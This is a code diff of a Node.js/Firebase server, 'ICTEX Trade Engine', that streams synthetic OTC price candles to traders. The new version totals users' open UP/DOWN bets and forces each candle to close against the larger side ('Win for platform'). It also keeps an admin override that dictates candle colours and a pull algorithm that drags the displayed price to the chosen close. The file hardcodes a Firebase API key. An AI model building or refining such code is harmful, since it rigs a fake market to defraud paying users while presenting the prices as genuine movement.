@@ -1,3 +1,4 @@
+// 🔥 ICTEX Trade Engine V23 - "Safe Decision Window" Architecture
 const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
@@ -5,7 +6,7 @@ const cors = require('cors');
 const firebase = require('firebase/app');
 require('firebase/database');
 
-// Firebase Configuration
+// --- Firebase Config ---
 const firebaseConfig = {
     apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
     authDomain: "ictex-trade.firebaseapp.com",
@@ -24,239 +25,232 @@ app.use(cors());
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-const MAX_CANDLES = 1000;
-const TIMEFRAME = 60000; // 1 Minute
-const TICK_MS = 300;     // Update every 300ms
-const MIN_PRICE = 0.00001;
+// --- Constants ---
+const MAX_CANDLES = 1500;
+const TIMEFRAME = 60000;
+const TICK_MS = 300;
+const DECISION_WINDOW_MS = 5000; // 5 সেকেন্ড পর সিদ্ধান্ত নিবে
 const HISTORY_SEED_COUNT = 300;
+const MIN_PRICE = 0.00001;
 
+// --- In-Memory State ---
 const markets = {}; 
-const adminPatterns = {}; 
 
+// --- Helper Functions ---
 function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
 
-// --- Admin Control Listener ---
+// --- Firebase Listeners ---
 db.ref('admin/markets').on('value', (snapshot) => {
     const fbMarkets = snapshot.val() || {};
-    Object.keys(fbMarkets).forEach(marketId => {
+    Object.keys(fbMarkets).forEach((marketId) => {
         const type = fbMarkets[marketId]?.type;
         if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
             initializeNewMarket(marketId);
         }
-        if (fbMarkets[marketId]?.pattern_config?.isActive) {
-            adminPatterns[marketId] = fbMarkets[marketId].pattern_config;
-        } else {
-            delete adminPatterns[marketId];
-        }
     });
 });
 
+// --- Candle Generation ---
 function generateHistoricalCandle(timestamp, open) {
-    const safeOpen = Math.max(MIN_PRICE, open);
     const isGreen = Math.random() > 0.5;
-    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
-    const close = isGreen ? safeOpen + body : safeOpen - body;
-    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
-    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
-
-    return {
-        timestamp,
-        open: roundPrice(safeOpen),
-        high: roundPrice(Math.max(safeOpen, close) + upperWick),
-        low: roundPrice(Math.min(safeOpen, close) - lowerWick),
-        close: roundPrice(close)
-    };
+    const body = (0.00006 + Math.random() * 0.00025) * open;
+    const close = isGreen ? open + body : open - body;
+    const upperWick = (0.00003 + Math.random() * 0.00015) * open;
+    const lowerWick = (0.00003 + Math.random() * 0.00015) * open;
+    return { timestamp, open: roundPrice(open), high: roundPrice(Math.max(open, close) + upperWick), low: roundPrice(Math.min(open, close) - lowerWick), close: roundPrice(close) };
 }
 
 async function initializeNewMarket(marketId) {
     const path = marketPathFromId(marketId);
-    let startPrice = 1.15;
-
-    try {
-        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
-        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
-    } catch (e) {}
-
     const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
-    const candles =[];
-    let currentPrice = startPrice;
+    const candles = [];
+    let currentPrice = 1.15;
 
     for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
         const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice);
         candles.push(c);
         currentPrice = c.close;
     }
+    
+    // Store in Firebase
+    const historyRef = db.ref(`market_history/${marketId}`);
+    await historyRef.set(candles);
 
     markets[marketId] = {
         marketId,
         marketPath: path,
-        history: candles,
         currentPrice: currentPrice,
         candleStartTime: 0,
-        targetClose: null,   // Target price for the end of the minute
-        targetColor: null    // 'GREEN' or 'RED'
+        decisionMade: false,
+        targetClose: null,
     };
 }
 
-// 🔥 Core Engine: Setup Target for the New Minute
+
+// 🔥🔥🔥 মূল পরিবর্তন এখানে 🔥🔥🔥
+// Step 1: নতুন ক্যান্ডেল শুরু হলে শুধু একটি খালি শেল তৈরি করা
 function ensureCurrentPeriodCandle(marketData, currentPeriod) {
-    let lastCandle = marketData.history[marketData.history.length - 1];
-    if (!lastCandle) return null;
-
-    if (currentPeriod > lastCandle.timestamp) {
-        marketData.candleStartTime = currentPeriod;
-        let adminColor = null;
-        const adminPattern = adminPatterns[marketData.marketId];
-
-        // Check if Admin set a pattern
-        if (adminPattern && currentPeriod >= adminPattern.startTime) {
-            const patternIndex = Math.floor((currentPeriod - adminPattern.startTime) / TIMEFRAME);
-            if (patternIndex >= 0 && patternIndex < adminPattern.pattern.length) {
-                adminColor = adminPattern.pattern[patternIndex]; // 'GREEN' or 'RED'
-                console.log(`[ADMIN CONTROL] Market: ${marketData.marketId} | Forced to: ${adminColor}`);
-            }
-        }
-
-        // Randomly pick color if admin didn't set one
-        if (!adminColor) {
-            adminColor = Math.random() > 0.5 ? 'GREEN' : 'RED';
-        }
-
-        // Set the PERFECT Target Close Price
-        const openPrice = lastCandle.close;
-        const bodySize = openPrice * (0.0001 + Math.random() * 0.00015);
+    const historyRef = db.ref(`market_history/${marketData.marketId}`);
+    
+    historyRef.orderByKey().limitToLast(1).once('value', (snapshot) => {
+        const lastCandleArr = snapshot.val();
+        if(!lastCandleArr) return;
+        const lastCandle = lastCandleArr[Object.keys(lastCandleArr).length-1];
         
-        marketData.targetColor = adminColor;
-        if (adminColor === 'GREEN' || adminColor === 'UP') {
-            marketData.targetClose = openPrice + bodySize;
-        } else {
-            marketData.targetClose = openPrice - bodySize;
-        }
+        if (currentPeriod > lastCandle.timestamp) {
+            const newCandle = {
+                timestamp: currentPeriod,
+                open: lastCandle.close,
+                high: lastCandle.close,
+                low: lastCandle.close,
+                close: lastCandle.close,
+            };
 
-        // Create the initial shell for the new candle
-        const newCandle = {
-            timestamp: currentPeriod,
-            open: roundPrice(openPrice),
-            high: roundPrice(openPrice),
-            low: roundPrice(openPrice),
-            close: roundPrice(openPrice)
-        };
-
-        marketData.history.push(newCandle);
-        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
-        
-        return newCandle;
-    }
-    return lastCandle;
-}
-
-// 🔥 The "Magnetic" Price Algorithm
-function updateRealisticPrice(marketData, candle) {
-    const now = Date.now();
-    const elapsedMs = now - marketData.candleStartTime;
-    const progress = Math.min(elapsedMs / TIMEFRAME, 1.0); // 0.0 to 1.0 (0 to 60 seconds)
-
-    const openPrice = candle.open;
-    const baseVolatility = openPrice * 0.00004;
-
-    // Normal Random Movement
-    let tickMove = (Math.random() - 0.5) * baseVolatility * 2;
-
-    // 🎯 Magnetic Pull Logic
-    if (progress > 0.65) { 
-        // In the last 35% of the minute (after 39 seconds), start pulling towards the target
-        const distanceToTarget = marketData.targetClose - marketData.currentPrice;
-        // The closer to 60 seconds, the stronger the pull
-        const pullStrength = (progress - 0.65) / 0.35; 
-        
-        tickMove += (distanceToTarget * pullStrength * 0.15);
-    }
-
-    // 🔒 Final Lock (Last 1 second)
-    if (progress >= 0.98) {
-        marketData.currentPrice = marketData.targetClose;
-    } else {
-        marketData.currentPrice += tickMove;
-    }
-
-    // Update Candle Data
-    candle.close = roundPrice(marketData.currentPrice);
-    candle.high = roundPrice(Math.max(candle.high, candle.close));
-    candle.low = roundPrice(Math.min(candle.low, candle.close));
-}
-
-function broadcastCandle(marketId, candle) {
-    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
-    wss.clients.forEach((client) => {
-        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
-            client.send(payload);
+            // Update state
+            marketData.candleStartTime = currentPeriod;
+            marketData.decisionMade = false;
+            marketData.targetClose = null;
+            marketData.currentPrice = newCandle.open;
+            
+            // Add new empty candle to history
+            historyRef.push(newCandle);
+            db.ref(`market_history/${marketData.marketId}`).orderByKey().limitToFirst(1).once('value', s => {
+                if(s.exists()){
+                     db.ref(`market_history/${marketData.marketId}/${Object.keys(s.val())[0]}`).remove();
+                }
+            });
         }
     });
 }
 
+// Step 2: "সেফ ডিসিশন উইন্ডো"-তে সিদ্ধান্ত গ্রহণ
+async function makeDecisionForCurrentCandle(marketData) {
+    if (marketData.decisionMade) return;
+
+    const openPrice = marketData.currentPrice; // Open price is the current price at decision time
+    let finalColor = null;
+
+    // 1. Check for Admin Command
+    const patternSnap = await db.ref(`admin/markets/${marketData.marketId}/pattern_config`).once('value');
+    const adminPattern = patternSnap.val();
+    if (adminPattern && adminPattern.isActive && adminPattern.startTime === marketData.candleStartTime) {
+        finalColor = adminPattern.pattern[0]; // 'GREEN' or 'RED'
+        db.ref(`admin/markets/${marketData.marketId}/pattern_config`).remove(); // Command used, so remove it
+    }
+
+    // 2. If no Admin command, check user trades
+    if (!finalColor) {
+        const tradesSnap = await db.ref(`active_trades/${marketData.marketId}`).once('value');
+        const trades = tradesSnap.val() || {};
+        let totalUp = 0, totalDown = 0;
+        Object.values(trades).forEach(trade => {
+            if (trade.direction === 'UP') totalUp += trade.amount;
+            else if (trade.direction === 'DOWN') totalDown += trade.amount;
+        });
+
+        if (totalUp > totalDown) finalColor = 'RED'; // Win for platform
+        else if (totalDown > totalUp) finalColor = 'GREEN'; // Win for platform
+        else finalColor = Math.random() > 0.5 ? 'GREEN' : 'RED'; // Random if equal
+        
+        if(trades) db.ref(`active_trades/${marketData.marketId}`).remove();
+    }
+    
+    // 3. Lock the Target
+    const bodySize = openPrice * (0.0001 + Math.random() * 0.00015);
+    marketData.targetClose = finalColor === 'GREEN' ? openPrice + bodySize : openPrice - bodySize;
+    marketData.decisionMade = true;
+    
+    console.log(`[DECISION @ ${new Date().getSeconds()}s] Market: ${marketData.marketId} -> ${finalColor}`);
+}
+
+// Step 3: লাইভ প্রাইসকে টার্গেটের দিকে টেনে নেওয়া
+function updateRealisticPrice(marketData, currentCandleInHistory) {
+    const now = Date.now();
+    const elapsedMs = now - marketData.candleStartTime;
+    const progress = Math.min(elapsedMs / TIMEFRAME, 1.0);
+
+    const baseVolatility = currentCandleInHistory.open * 0.00004;
+    let tickMove = (Math.random() - 0.5) * baseVolatility * 2;
+
+    if (marketData.decisionMade) {
+        const distanceToTarget = marketData.targetClose - marketData.currentPrice;
+        const pullStrength = progress > 0.1 ? (progress - 0.1) / 0.9 : 0;
+        tickMove += (distanceToTarget * pullStrength * 0.15);
+    }
+    
+    marketData.currentPrice += tickMove;
+
+    return roundPrice(marketData.currentPrice);
+}
+
+// --- WebSocket & API ---
 wss.on('connection', (ws) => {
     ws.on('message', (raw) => {
         try {
             const msg = JSON.parse(raw.toString());
-            if (msg?.type === 'subscribe') {
-                ws.subscribedMarket = msg.market;
-                if (markets[msg.market]) {
-                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
-                    ws.send(JSON.stringify(historyPayload));
-                }
-            }
+            if (msg?.type === 'subscribe') ws.subscribedMarket = msg.market;
         } catch (_) {}
     });
 });
 
-app.get('/api/history/:marketId', (req, res) => {
+app.get('/api/history/:marketId', async (req, res) => {
     const marketId = req.params.marketId;
-    if (markets[marketId] && markets[marketId].history) {
-        res.json(markets[marketId].history);
-    } else {
-        res.status(404).json({ error: 'Market not found' });
+    try {
+        const snap = await db.ref(`market_history/${marketId}`).orderByKey().limitToLast(1500).once('value');
+        if(snap.exists()){
+            res.json(Object.values(snap.val()));
+        } else {
+             res.status(404).json({ error: 'History not found' });
+        }
+    } catch(e) {
+        res.status(500).json({ error: 'Server error' });
     }
 });
 
-// Main High-Frequency Loop
-let lastSyncMinute = 0;
+// --- Main Loop ---
 setInterval(() => {
     const now = Date.now();
     const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
-    const currentMinute = Math.floor(now / 60000);
+    const secondsInMinute = new Date(now).getSeconds();
 
     for (const marketId in markets) {
         const marketData = markets[marketId];
-        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
-        if (!candle) continue;
+        
+        // Ensure new candle shell is created at the start of the minute
+        ensureCurrentPeriodCandle(marketData, currentPeriod);
 
-        updateRealisticPrice(marketData, candle);
-        broadcastCandle(marketId, candle);
-    }
+        // Make the decision after the "Safe Decision Window"
+        if (secondsInMinute >= 5 && !marketData.decisionMade) {
+            makeDecisionForCurrentCandle(marketData);
+        }
 
-    // Backup to Firebase once per minute (for UI persistence if server restarts)
-    if (currentMinute > lastSyncMinute) {
-        lastSyncMinute = currentMinute;
-        const batchUpdates = {};
-        for (const marketId in markets) {
-            const m = markets[marketId];
-            const lastC = m.history[m.history.length-1];
-            if (lastC) {
-                batchUpdates[`markets/${m.marketPath}/live`] = {
-                    price: lastC.close,
-                    timestamp: lastC.timestamp
-                };
-            }
-        }
-        if(Object.keys(batchUpdates).length > 0) {
-            db.ref().update(batchUpdates).catch(()=>{});
-            console.log(`[Batch Sync] ${Object.keys(markets).length} markets backed up to Firebase.`);
-        }
+        // Send live ticks to clients
+        db.ref(`market_history/${marketId}`).orderByKey().limitToLast(1).once('value', snap => {
+            if(!snap.exists()) return;
+            const currentCandle = Object.values(snap.val())[0];
+            const livePrice = updateRealisticPrice(marketData, currentCandle);
+            
+            const payload = JSON.stringify({
+                market: marketId,
+                candle: {
+                    ...currentCandle,
+                    close: livePrice,
+                    high: Math.max(currentCandle.high, livePrice),
+                    low: Math.min(currentCandle.low, livePrice)
+                },
+                serverTime: now
+            });
+            
+            wss.clients.forEach((client) => {
+                if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
+                    client.send(payload);
+                }
+            });
+        });
     }
 }, TICK_MS);
 
-app.get('/ping', (_req, res) => res.send('ICTEX Trade Engine V22 - Magnetic Algorithm Active'));
-
+app.get('/ping', (_req, res) => res.send('ICTEX Engine V23 - Safe Decision Window Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Engine running on ${PORT}`));
